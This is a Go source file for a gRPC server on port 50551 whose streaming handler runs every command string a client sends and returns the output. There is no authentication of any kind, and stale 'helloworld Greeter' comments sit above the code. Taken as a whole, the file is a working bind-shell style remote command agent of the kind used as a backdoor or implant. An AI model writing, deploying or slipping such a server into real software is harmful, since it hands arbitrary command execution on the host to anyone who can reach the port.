package main

import (
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"time"

	pb "github.com/bartimus-primed/proto/pb"
	"google.golang.org/grpc"
)

const (
	port = ":50551"
)

// server is used to implement helloworld.GreeterServer.
type server struct {
	pb.UnimplementedInteractServer
}

// SayHello implements helloworld.GreeterServer
// func (s *server) RunCommandAndRespond(ctx context.Context, in *pb.Command) (*pb.Response, error) {
// 	log.Printf("Received: %v", in.GetCmd())
// 	cmd := in.GetCmd()
// 	out, _ := exec.Command(cmd).Output()
// 	return &pb.Response{Resp: string(out), Success: true}, nil
// }

// func (s *server) RunCommand(ctx context.Context, in *pb.Command) (*emptypb.Empty, error) {
// 	log.Printf("Received: %v", in.GetCmd())
// 	cmd := in.GetCmd()
// 	out, _ := exec.Command(cmd).Output()
// 	fmt.Printf("Running: %s without sending response.", out)
// 	return &emptypb.Empty{}, nil
// }

func (s *server) HandsOn(stream pb.Interact_HandsOnServer) error {
	for {
		in, err := stream.Recv()
		if err == io.EOF {
			fmt.Println("RECEIVED EOF")
			return nil
		}
		if err != nil {
			return err
		}
		if in.GetCmd() == "exit" {
			fmt.Println("Received kill command")
			stream.Send(&pb.Response{Resp: "exit", Success: true})
			time.Sleep(time.Second * 2)
			os.Exit(0)
		}
		log.Printf("Received: %v", in.GetCmd())
		cmd := in.GetCmd()
		out, _ := exec.Command(cmd).Output()
		stream.Send(&pb.Response{Resp: string(out), Success: true})
	}
}

func main() {
	lis, err := net.Listen("tcp", port)
	if err != nil {
		log.Fatalf("failed to listen: %v", err)
	}
	s := grpc.NewServer()
	pb.RegisterInteractServer(s, &server{})
	log.Printf("server listening at %v", lis.Addr())
	if err := s.Serve(lis); err != nil {
		log.Fatalf("failed to serve: %v", err)
	}
}
